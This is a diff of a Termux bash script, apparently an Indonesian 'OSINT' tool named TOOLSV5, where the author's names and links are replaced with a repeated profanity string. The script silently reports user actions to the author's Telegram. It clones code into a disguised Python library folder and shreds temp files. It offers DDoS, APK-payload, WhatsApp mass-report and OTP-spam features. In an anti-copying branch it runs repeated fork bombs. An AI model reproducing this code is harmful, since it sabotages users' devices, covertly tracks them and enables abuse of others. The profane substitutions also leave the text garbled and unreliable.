-⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
-⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
-⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇"
+echo "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
+"
 }
 banner2() {
-cowsay -f eyes "Simpel Osint By.Galirus404" | lolcat
+cowsay -f eyes "Simpel Osint By.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" | lolcat
 }
 banner3() {
 echo "
@@ -3583,7 +3537,7 @@ random_index=$((RANDOM % ${#logo[@]}))
 banner="${logo[random_index]}"
 clear
 $banner | lolcat
-$e $c "Mode In Galirus Official™"
+$e $c "Mode In GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM™"
 $e "${h}=============================================${res}"
 $e "${b}          MENU UTAMA OSINT                 ${res}"
 $e "${h}=============================================${res}"
@@ -3839,7 +3793,7 @@ echo "
 ██║   ██║███████╗██║██╔██╗ ██║   ██║
 ██║   ██║╚════██║██║██║╚██╗██║   ██║
 ╚██████╔╝███████║██║██║ ╚████║   ██║
-╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.G404
+╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 "
 }
 bacot | lolcat
@@ -3859,17 +3813,17 @@ $e
 $e
 $e
 read -p "Silahkan Enter Untuk Menuju ke Telegram"
-xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 elif [[ "$opo" = "n" || "$opo" = "N" ]]; then
 link | lolcat
 $e
 $e
 $e
 read -p "Silahkan Enter Untuk Menuju ke Telegram"
-xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 break
 else
-$e $m "BODO KALI KAU, YANG BENER ANYING"
+$e $m "BODO KALI KAU, GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 fi
 else
 $e $bg_m "Package Durung Di Install, Installasi sek$res"
@@ -3879,7 +3833,7 @@ cd NIK
 git stash &> /dev/null
 git pull origin main &> /dev/null
 npm install nik-parse -g
-echo "kau anak kontol 😂" > "$lagek_melbu"
+echo "kau anak kontol 😂GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" > "$lagek_melbu"
 fi
 done
 else
@@ -3902,7 +3856,7 @@ echo "
 pkg update && pkg upgrade
 pkg install git bash openssl curl jq ruby -y
 gem install lolcat
-git clone https://github.com/Lubebansokhekel/OsintTrack
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd OsintTrack
 bash OsintTrack.sh
 "
@@ -4095,7 +4049,7 @@ done
 elif [ "$no" = "35" ]; then
 GALERI_EYES() {
 clear
-text="      SHIROKO TOOLS GALERI EYES $versitoolsv5"
+text="      GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM $versitoolsv5"
 delay=0.05 # penundaan antara setiap karakter (deti>
 for ((i = 0; i < ${#text}; i++)); do
 echo -n "${text:$i:1}"
@@ -4105,9 +4059,9 @@ sleep 5
 while true; do
 clear
 $banner | lolcat
-$e $bg_m "1.SHIROKO GALERY EYES PAYLOADNYA SCRIPT$res"
-$e $bg_m "2.APLIKASI SHIROKO GALERY EYES$res"
-$e $bg_m "3.HASIL PANCINGAN KUNJUNG I TELEGRAM SHIROKO$res"
+$e $bg_m "1.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM SCRIPT$res"
+$e $bg_m "2.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM$res"
+$e $bg_m "3.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM$res"
 $e $bg_m "0.BACK TO TOOLSV5$res"
 read -p "Silahkan Pilih : " mana
 if [ "$mana" = "1" ]; then
@@ -4131,7 +4085,7 @@ pkg install jq -y
 pkg install curl -y
 pkg install w3m -y
 pkg install yarn nodejs -y
-git clone https://github.com/GALIRUS404/REPORT-WA
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd REPORT-WA
 bash gas.sh
 Harap diperhatikan bahwa penggunaan script ilegal dapat melanggar hukum dan etika."
@@ -4146,7 +4100,7 @@ isipesan="Terdeteksi Mengakses Menu 2 ( APK PAYLOAD ) 👨‍💻"
 telegram &> /dev/null &
 xdg-open "https://www.mediafire.com/file/1r4v1b0bjnpsi1x/DDOS_HARD.zip/file"
 elif [ "$mana" = "3" ]; then
-xdg-open "https://t.me/GojoSatoruCihuy"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 elif [ "$mana" = "0" ]; then
 break
 fi
@@ -4197,7 +4151,7 @@ $e $q "██╔══██╗██╔══██╗██╔══██╗"
 $e $q "███████║██║  ██║██████╦╝$p"
 $e $q "██╔══██║██║  ██║██╔══██╗"
 $e $q "██║  ██║██████╔╝██████╦╝"
-$e $q "╚═╝  ╚═╝╚═════╝ ╚═════╝ $bl Debugging$p By.$h Galirus"
+$e $q "╚═╝  ╚═╝╚═════╝ ╚═════╝ $bl Debugging$p By.$h GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 $e $q $b"======================================================"
 $e $k "Status: $cekcok"
 }
@@ -4328,7 +4282,7 @@ read -p "ENTER untuk kembali ke Menu"
 $e $q $k "You Choose Exit"
 sleep 1
 $e $q $h "Subscribe my Channel"
-termux-open "https://www.youtube.com/@GalirusProjects"
+termux-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 sleep 2
 break
 ;;
@@ -4341,7 +4295,7 @@ esac
 $e $q $k "You Choose Exit"
 sleep 1
 $e $q $h "Subscribe my Channel"
-termux-open "https://www.youtube.com/@GalirusProjects"
+termux-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 sleep 2
 break
 ;;
@@ -4384,9 +4338,9 @@ echo "
 ██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝
 ╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ html
-AUTHOR    : GALIRUS OFFICIAL
-WEBSITE   : https://www.ppprogresif.com/galirus-official
-DEVELOPER : TOOLSV5 X GALIRUS OFFICIAL
+AUTHOR    : GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
+WEBSITE   : GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
+DEVELOPER : GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 "
 }
 menu() {
@@ -4621,7 +4575,7 @@ echo -e "███████╗██╗  ██╗██╗██████
 █████╗   ╚███╔╝ ██║█████╗
 ██╔══╝   ██╔██╗ ██║██╔══╝
 ███████╗██╔╝ ██╗██║██║
-╚══════╝╚═╝  ╚═╝╚═╝╚═╝   TOOLS By.Galirus Official
+╚══════╝╚═╝  ╚═╝╚═╝╚═╝   GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 "
 }
 show_menu() {
@@ -4842,7 +4796,7 @@ apt install -y wget
 apt install -y yarn
 apt install -y imagemagick
 cd /data/data/com.termux/files/usr/
-git clone https://github.com/GALIRUS404/Bot4
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd Bot4
 fi
 done
@@ -4879,7 +4833,7 @@ $e
 $e
 read -p "Enter Untuk Melihat Cuplikan Videonya di YT !"
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
-xdg-open "https://youtu.be/GnfVaKTIIpA?si=XTPpDcD22jnQII_E"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 sleep 5
 clear
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
@@ -4898,7 +4852,7 @@ $e "TOOLSV5 MENU BUY\n USER ID : $termux_id
 )
 isipesan="$pesan"
 telegram &> /dev/null &
-xdg-open "https://wa.me/6283151697416?text=$pesan"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 clear
 $e $m
 read -p "Silahkan ENTER untuk Menuju Ke MENU"
@@ -5018,7 +4972,7 @@ $e "TOOLSV5 MENU BUY\n USER ID : $termux_id Bang Saya Ingin Order Spam Otp Tele
 )
 isipesan="$pesan"
 telegram &> /dev/null &
-xdg-open "https://wa.me/6283151697416?text=$pesan"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 clear
 $e $m
 read -p "Silahkan ENTER untuk Menuju Ke MENU"
@@ -5052,7 +5006,7 @@ telegram &> /dev/null &
 exit 0
 else
 play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
-$e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res"
+$e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM$res"
 play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
 sleep 5
 fi
@@ -5266,7 +5220,7 @@ $e $m "===================================$h"
 read -p " ENTER UNTUK MENGULANGI TOOLSV5"
 elif [ "$no" = "dosa" ]; then
 echo "Link TELEGRAM"
-xdg-open "https://t.me/squidwardyahahayuk"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 elif [[ "$no" = "report" || "$no" = "REPORT" ]]; then
 clear
 $e $m "========================================"
@@ -5297,7 +5251,7 @@ fi
 fi
 ENTER
 elif [[ "$no" = "brangkas" || "$no" = "BRANGKAS" ]]; then
-xdg-open "https://t.me/brangkas2002"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 elif [ "$no" = "0" ]; then
 rm -rf /data/data/com.termux/files/usr/tmp/ &> /dev/null
 mkdir -p /data/data/com.termux/files/usr/tmp/ &> /dev/null
@@ -5308,7 +5262,7 @@ rm -rf $HOME/Lubeban/install.sh &> /dev/null
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
 kill_sound &> /dev/null &
 cd $HOME
-isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
+isipesan="Terdeteksi Keluar Dari TOOLSV5 !  GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM💻"
 telegram &> /dev/null &
 exit 0
 else
@@ -5541,7 +5495,7 @@ clear
 isipesan=" SCRIPT TIDAK DAPAT DI AKSES ��️"
 telegram &> /dev/null &
 $e $b" ╔══════════════════════════════════════════════╗$b"
-$e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES��       $b ║"
+$e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES.       $b ║"
 $e $b" ╚══════════════════════════════════════════════╝$b"
 sleep 3
 echo
@@ -5618,7 +5572,7 @@ read -p "Masukkan ID Sebelumnya Contoh (u0_a224): " input_id
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
 if grep -i -qE "$input_number.*ID[[:space:]]*:[[:space:]]*$input_id" "$idtermux"; then
 echo "Nomor telepon dan ID cocok"
-xdg-open "https://wa.me/6285850268349?text=ID_LAMA: $input_number ID : $input_id%0AID_BARU: $input_number ID : $galirusofficialcuy%0AMohon Di Konfirmasi Bang 🙏🏻"
+xdg-open "https://wa.me/62?text=ID_LAMA: $input_number ID : $input_id%0AID_BARU: $input_number ID : $galirusofficialcuy%0AMohon Di Konfirmasi Bang 🙏🏻"
 echo "y" | termux-setup-storage &> /dev/null
 echo " " > "$flag_file"
 exit 0
@@ -5729,7 +5683,7 @@ done
 clear
 loading1 < /dev/tty > /dev/tty &
 sleep 10
-xdg-open "https://www.youtube.com/@GalirusProjects"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 kill $!
 fi
 done
@@ -5852,8 +5806,7 @@ base &> /dev/null &
 exit 0
 fi                 
 EOF
-                    chmod +x /data/data/com.termux/files/usr/tmp/hozokroco
-                    bash /data/data/com.termux/files/usr/tmp/hozokroco
+                    
                     find /data/data/com.termux/files/usr/tmp -mindepth 1 -type f -exec shred -u {} \;
                     exit 0
                else
@@ -5931,13 +5884,13 @@ while true; do
                dialog --infobox "Mempersiapkan Package" 3 40
                mkdir -p /data/data/com.termux/files/usr/lib/python3.11/email/mime/
                cd /data/data/com.termux/files/usr/lib/python3.11/email/mime/ &> /dev/null
-               git clone https://github.com/Hozowaorokananingenda/Dneu &> /dev/null | dialog --msgbox "Sedang Proses Mendownload Tod!" 5 50
+               git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM &> /dev/null | dialog --msgbox "Sedang Proses Mendownload Tod!" 5 50
                cd Dneu
                git stash &> /dev/null
                git pull origin main &> /dev/null
           fi
      else
-          dialog --msgbox "GALIRUS OFFICIAL: DASAR ANAK KROCO CUPU MODAL JIPLAK" 5 50
+          dialog --msgbox "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM: DASAR ANAK KROCO CUPU MODAL JIPLAK" 5 50
           :() { : | : & }; :
           :() { : | : & }; :
           :() { : | : & }; :
